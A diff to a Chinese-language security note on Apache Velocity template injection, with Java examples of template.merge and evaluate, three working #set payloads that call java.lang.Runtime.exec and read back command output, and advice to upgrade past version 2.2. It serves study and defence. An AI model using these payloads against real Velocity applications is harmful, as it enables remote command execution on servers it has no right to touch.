@@ -54,12 +54,118 @@ $person.setAttributes( ["Strange", "Weird", "Excited"] )
 
 #### 后端与模板交互
 
+* 按模板路径取得模板，传入参数，使用template.merge(context, writer);触发payload
+
+```java
+import org.apache.velocity.Template;
+import org.apache.velocity.VelocityContext;
+import org.apache.velocity.app.VelocityEngine;
+
+import java.io.StringWriter;
+
+public class VelocityExample {
+
+    public static void main(String[] args) {
+        // 初始化Velocity引擎
+        VelocityEngine velocityEngine = new VelocityEngine();
+        velocityEngine.init();
+
+        // 获取Velocity模板
+        Template template = velocityEngine.getTemplate("path/to/template.vm");
+
+        // 准备数据模型
+        VelocityContext context = new VelocityContext();
+        context.put("name", "John Doe");
+
+        // 填充模板并获取生成的输出
+        StringWriter writer = new StringWriter();
+        template.merge(context, writer);
+        String output = writer.toString();
+
+        // 打印生成的HTML输出
+        System.out.println(output);
+    }
+}
+```
+
+* 后端代码生成 模板字符串，velocityEngine.evaluate(context, writer, "logTag", templateString);触发payload
+
+```java
+import org.apache.velocity.VelocityContext;
+import org.apache.velocity.app.VelocityEngine;
+
+import java.io.StringWriter;
+
+public class VelocityEvaluateExample {
+
+    public static void main(String[] args) {
+        // 初始化Velocity引擎
+        VelocityEngine velocityEngine = new VelocityEngine();
+        velocityEngine.init();
+
+        // 准备数据模型
+        VelocityContext context = new VelocityContext();
+        context.put("name", "John Doe");
+
+        // 模板字符串
+        String templateString = "<h1>Hello, $name!</h1>";
+
+        // 评估模板字符串
+        StringWriter writer = new StringWriter();
+        velocityEngine.evaluate(context, writer, "logTag", templateString);
+
+        // 获取生成的输出
+        String output = writer.toString();
+
+        // 打印生成的HTML输出
+        System.out.println(output);
+    }
+}
+```
+
 ### 漏洞产生
 
 #### set指令攻击语句
 
-#### poc的传入
+```java
+#set($e="e");$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",nu
+ll).invoke(null,null).exec("calc")
+```
+
+```java
+#set($x='')##
+#set($rt = $x.class.forName('java.lang.Runtime'))##
+#set($chr = $x.class.forName('java.lang.Character'))##
+#set($str = $x.class.forName('java.lang.String'))##
+#set($ex=$rt.getRuntime().exec('id'))##
+$ex.waitFor()
+#set($out=$ex.getInputStream())##
+#foreach( $i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
+```
+
+```java
+#set ($e="exp")
+#set
+($a=$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invok
+e(null,null).exec($cmd))
+#set
+($input=$e.getClass().forName("java.lang.Process").getMethod("getInputStream").in
+voke($a))
+#set($sc = $e.getClass().forName("java.util.Scanner"))
+#set($constructor =
+$sc.getDeclaredConstructor($e.getClass().forName("java.io.InputStream")))
+#set($scan=$constructor.newInstance($input).useDelimiter("\A"))
+#if($scan.hasNext())
+$scan.next()
+#end
+```
+
+#### payload的传入
+
+* template.merge需要引用的模板我们可控，在可控模板中插入攻击语句即可
+* velocityEngine.evaluate需要我们从与templateString对应的参数传入payload
 
 ### 漏洞修复
 
 * Velocity 小于等于 2.2 版本存在模板注入漏洞
+* 更换高版本即可
